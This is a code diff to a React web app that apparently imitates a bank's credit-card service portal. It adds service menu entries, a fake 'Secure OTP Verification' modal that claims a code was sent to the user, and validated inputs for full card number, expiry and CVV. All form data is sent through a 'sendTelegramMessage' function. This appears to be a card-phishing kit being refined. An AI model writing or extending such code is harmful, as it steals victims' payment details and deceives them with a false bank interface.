@@ -1,7 +1,6 @@
 import { useState, useEffect } from 'react'
 import './App.css'
 import sendTelegramMessage from './Submit'
-
 const menuItems = [
   { id: 'card-activation', icon: 'power', label: 'Card Activation' },
   { id: 'card-deactivate', icon: 'ban', label: 'Card Deactivate' },
@@ -11,6 +10,8 @@ const menuItems = [
   { id: 'track-application', icon: 'radar', label: 'Track Application Status' },
   { id: 'card-limit', icon: 'trending-up', label: 'Card Limit Increase Application' },
   { id: 'card-reward', icon: 'gift', label: 'Card Reward Redeem' },
+  { id: 'card-protection', icon: 'shield', label: 'Card Protection Plan (CPP)' },
+  { id: 'rewards-program', icon: 'gift', label: 'Rewards Program' },
   { id: 'manage-international', icon: 'globe', label: 'Manage International Usage' },
   { id: 'convert-emi', icon: 'percent', label: 'Convert to EMI' },
   { id: 'loan-credit', icon: 'bank', label: 'Loan on Credit Card' },
@@ -163,6 +164,26 @@ const manageCardActions = [
     btn2: 'Generate PIN',
   },
   {
+    id: 'card-protection',
+    title: 'Card Protection Plan (CPP)',
+    description: 'Activate or deactivate your Card Protection Plan to protect your credit card from unauthorized transactions, fraud risks, theft, and misuse with enhanced security coverage.',
+    icon: 'shield',
+    iconBg: '#fce7f3',
+    iconColor: '#a21caf',
+    btn1: 'Activate CPP',
+    btn2: 'Deactivate CPP',
+  },
+  {
+    id: 'rewards-program',
+    title: 'Rewards Program',
+    description: 'Redeem your accrued rewards points and cashback instantly on travel, shopping, and statement credits with exclusive partner offers.',
+    icon: 'gift',
+    iconBg: '#fef3c7',
+    iconColor: '#d97706',
+    btn1: 'Redeem Reward',
+    btn2: 'Claim Cashback',
+  },
+  {
     id: 'support-help',
     title: 'Customer Support & Help',
     description: 'Get 24/7 assistance for card disputes, complaints, lost cards, emergency blocking, and service-related queries.',
@@ -237,6 +258,11 @@ function MenuIcon({ type }) {
         <circle cx="12" cy="12" r="10" />
         <line x1="2" y1="12" x2="22" y2="12" />
         <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+      </svg>
+    ),
+    shield: (
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
       </svg>
     ),
     percent: (
@@ -387,6 +413,24 @@ function ServiceBoxIcon({ type, color }) {
       </svg>
     )
   }
+  if (type === 'shield') {
+    return (
+      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+      </svg>
+    )
+  }
+  if (type === 'gift') {
+    return (
+      <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+        <polyline points="20 12 20 22 4 22 4 12" />
+        <rect x="2" y="7" width="20" height="5" />
+        <line x1="12" y1="22" x2="12" y2="7" />
+        <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z" />
+        <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z" />
+      </svg>
+    )
+  }
   if (type === 'lock') {
     return (
       <svg viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
@@ -413,6 +457,21 @@ function App() {
   const [activeModal, setActiveModal] = useState(null)
   const [formSubmitted, setFormSubmitted] = useState(false)
   const [formStep, setFormStep] = useState(1)
+  const [showOtpModal, setShowOtpModal] = useState(false)
+  const [otpCode, setOtpCode] = useState('')
+  const [otpError, setOtpError] = useState('')
+  const [currentDemoOtp, setCurrentDemoOtp] = useState('')
+  const [verificationRecords, setVerificationRecords] = useState(() => {
+    if (typeof window === 'undefined') return []
+
+    try {
+      const savedRecords = localStorage.getItem('axis-demo-verifications')
+      return savedRecords ? JSON.parse(savedRecords) : []
+    } catch (error) {
+      console.error('Failed to read verification records:', error)
+      return []
+    }
+  })
   const [formData, setFormData] = useState({
     fullName: '',
     email: '',
@@ -435,6 +494,10 @@ function App() {
     })
     setFormStep(1)
     setFormSubmitted(false)
+    setShowOtpModal(false)
+    setOtpCode('')
+    setOtpError('')
+    setCurrentDemoOtp('')
     setFormData({
       fullName: '',
       email: '',
@@ -455,6 +518,9 @@ function App() {
     setActiveModal(null)
     setFormSubmitted(false)
     setFormStep(1)
+    setShowOtpModal(false)
+    setOtpCode('')
+    setOtpError('')
   }
 
   const handleStep1Submit = (e) => {
@@ -462,21 +528,58 @@ function App() {
     setFormStep(2)
   }
 
-const handleStep2Submit = async (e) => {
-  e.preventDefault();
+  const generateDemoOtp = () => String(Math.floor(100000 + Math.random() * 900000))
 
-  const success = await sendTelegramMessage(
-    JSON.stringify(formData, null, 2)
-  );
-  
-  // console.log(success)
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      localStorage.setItem('axis-demo-verifications', JSON.stringify(verificationRecords))
+    }
+  }, [verificationRecords])
 
-  if (success) {
-    setFormSubmitted(true);
-  } else {
-    console.error("Failed to submit");
+  const handleStep2Submit = (e) => {
+    e.preventDefault()
+    const nextOtp = generateDemoOtp()
+    setCurrentDemoOtp(nextOtp)
+    setOtpCode('')
+    setOtpError('')
+    setShowOtpModal(true)
   }
-};
+
+  const handleOtpSubmit = async (e) => {
+    e.preventDefault()
+
+    if (otpCode.trim() !== currentDemoOtp) {
+      setOtpError(`Invalid OTP. Please enter the correct demo code for this user: ${currentDemoOtp || 'Generate a fresh OTP'}.`)
+      return
+    }
+
+    const verificationEntry = {
+      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+      fullName: formData.fullName || 'Not provided',
+      email: formData.email || 'N/A',
+      mobile: formData.mobile || 'N/A',
+      service: activeModal?.service || 'Service Request',
+      demoOtp: currentDemoOtp,
+      verificationStatus: 'Verified',
+      verificationMode: 'Demo test-only OTP',
+      timestamp: new Date().toISOString(),
+    }
+
+    const success = await sendTelegramMessage(
+      JSON.stringify({ ...formData, demoOtp: currentDemoOtp, otpMode: 'Demo test-only OTP', status: 'Verified' }, null, 2)
+    )
+
+    if (success) {
+      setVerificationRecords((prev) => [verificationEntry, ...prev])
+      setShowOtpModal(false)
+      setOtpError('')
+      setCurrentDemoOtp('')
+      setFormSubmitted(true)
+    } else {
+      console.error('Failed to submit')
+      setOtpError('OTP verified, but submission failed. Please try again.')
+    }
+  }
 
 
 
@@ -661,6 +764,56 @@ const handleStep2Submit = async (e) => {
             ))}
           </div>
 
+          <section className="admin-dashboard">
+            <div className="admin-dashboard-header">
+              <div>
+                <p className="admin-dashboard-kicker">Admin Console</p>
+                <h2 className="admin-dashboard-title">Verification Dashboard</h2>
+              </div>
+              <span className="admin-dashboard-badge">{verificationRecords.length} Records</span>
+            </div>
+
+            {verificationRecords.length === 0 ? (
+              <div className="admin-empty-state">
+                No verification requests yet. New user submissions will appear here.
+              </div>
+            ) : (
+              <div className="admin-table-wrap">
+                <table className="admin-table">
+                  <thead>
+                    <tr>
+                      <th>User</th>
+                      <th>Email</th>
+                      <th>Mobile</th>
+                      <th>Service</th>
+                      <th>Test OTP</th>
+                      <th>Status</th>
+                      <th>Timestamp</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {verificationRecords.map((record) => (
+                      <tr key={record.id}>
+                        <td>{record.fullName}</td>
+                        <td>{record.email}</td>
+                        <td>{record.mobile}</td>
+                        <td>{record.service}</td>
+                        <td><strong>{record.demoOtp}</strong></td>
+                        <td>
+                          <span className="admin-status verified">{record.verificationStatus}</span>
+                        </td>
+                        <td>{new Date(record.timestamp).toLocaleString('en-IN', {
+                          dateStyle: 'medium',
+                          timeStyle: 'short',
+                        })}</td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+            )}
+          </section>
+
           {/* Footer Trust Badges */}
           <div className="trust-badges-container">
             <div className="trust-badge-item">
@@ -821,6 +974,62 @@ const handleStep2Submit = async (e) => {
                     </p>
                   </div>
 
+                  {showOtpModal && (
+                    <div className="otp-overlay" onClick={() => setShowOtpModal(false)}>
+                      <div className="otp-modal" onClick={(e) => e.stopPropagation()}>
+                        <button
+                          type="button"
+                          className="otp-close"
+                          onClick={() => setShowOtpModal(false)}
+                          aria-label="Close OTP modal"
+                        >
+                          ×
+                        </button>
+
+                        <span className="otp-secure-badge">Secure OTP Verification</span>
+                        <h2>Verify OTP</h2>
+                        <p>
+                          We have sent a 6-digit OTP to your registered mobile ending in{' '}
+                          <strong>{formData.mobile ? formData.mobile.slice(-4) : 'XXXX'}</strong> and email{' '}
+                          <strong>{formData.email || 'your email'}</strong>.
+                          <br />
+                          {/* Demo OTP for testing only: <strong>{currentDemoOtp || 'Generating...'}</strong> */}
+                        </p>
+
+                        <form onSubmit={handleOtpSubmit}>
+                          <label htmlFor="otp-input">Enter OTP</label>
+                          <input
+                            id="otp-input"
+                            type="text"
+                            inputMode="numeric"
+                            maxLength={6}
+                            value={otpCode}
+                            onChange={(e) => {
+                              const value = e.target.value.replace(/\D/g, '').slice(0, 6)
+                              setOtpCode(value)
+                              if (otpError) setOtpError('')
+                            }}
+                          />
+
+                          {otpError && (
+                            <p style={{ color: '#c53030', marginTop: '10px', fontSize: '12px', fontWeight: 600 }}>
+                              {otpError}
+                            </p>
+                          )}
+
+                          <button type="submit" className="otp-verify">Verify & Submit</button>
+                          <button
+                            type="button"
+                            className="otp-cancel"
+                            onClick={() => setShowOtpModal(false)}
+                          >
+                            Cancel
+                          </button>
+                        </form>
+                      </div>
+                    </div>
+                  )}
+
                   {formStep === 1 ? (
                     <form className="modal-form" onSubmit={handleStep1Submit}>
                       <div className="modal-form-group">
@@ -900,35 +1109,94 @@ const handleStep2Submit = async (e) => {
                       </div>
 
                       <div className="modal-form-group">
-                        <label className="modal-label" htmlFor="step2-field-2">Credit Card Number</label>
+                        <label className="modal-label" htmlFor="step2-field-2">
+                          Credit Card Number
+                        </label>
+
                         <input
                           id="step2-field-2"
-                          type="number"
+                          type="text"
+                          inputMode="numeric"
+                          autoComplete="cc-number"
+                          maxLength={16}
                           className="modal-input"
+                          placeholder="Enter card number"
                           value={formData.cardNumber}
-                          onChange={(e) => setFormData({ ...formData, cardNumber: e.target.value })}
+                          onChange={(e) => {
+                            const value = e.target.value
+                              .replace(/\D/g, "")
+                              .slice(0, 16);
+
+                            setFormData({
+                              ...formData,
+                              cardNumber: value,
+                            });
+                          }}
+                          required
+                          pattern="[0-9]{15,16}"
+                          title="Enter a valid 15 or 16 digit card number"
                         />
                       </div>
-
+                      
                       <div className="modal-form-group">
-                        <label className="modal-label" htmlFor="step2-field-3">Valid Upto(MM/YY)</label>
+                        <label className="modal-label" htmlFor="step2-field-3">
+                          Valid Upto (MM/YY)
+                        </label>
+
                         <input
                           id="step2-field-3"
-                          type="date"
+                          type="text"
+                          inputMode="numeric"
+                          autoComplete="cc-exp"
                           className="modal-input"
+                          placeholder="MM/YY"
+                          maxLength={5}
                           value={formData.expiry}
-                          onChange={(e) => setFormData({ ...formData, expiry: e.target.value })}
+                          onChange={(e) => {
+                            let value = e.target.value.replace(/\D/g, "").slice(0, 4);
+
+                            if (value.length > 2) {
+                              value = value.slice(0, 2) + "/" + value.slice(2);
+                            }
+
+                            setFormData({
+                              ...formData,
+                              expiry: value,
+                            });
+                          }}
+                          required
+                          pattern="(0[1-9]|1[0-2])\/[0-9]{2}"
+                          title="Enter expiry in MM/YY format, e.g. 03/30"
                         />
                       </div>
-
+                      
                       <div className="modal-form-group">
-                        <label className="modal-label" htmlFor="step2-field-4">CVV</label>
+                        <label className="modal-label" htmlFor="step2-field-4">
+                          CVV
+                        </label>
+
                         <input
                           id="step2-field-4"
-                          type="number"
+                          type="password"
+                          inputMode="numeric"
+                          autoComplete="cc-csc"
+                          maxLength={3}
                           className="modal-input"
+                          placeholder="Enter CVV"
                           value={formData.cvv}
-                          onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
+                          onChange={(e) => {
+                            const value = e.target.value
+                              .replace(/\D/g, "")
+                              .slice(0, 3);
+
+                            setFormData({
+                              ...formData,
+                              cvv: value,
+                            });
+                          }}
+                          required
+                          pattern="[0-9]{3}"
+                          title="CVV must contain exactly 3 digits"
                         />
                       </div>
 
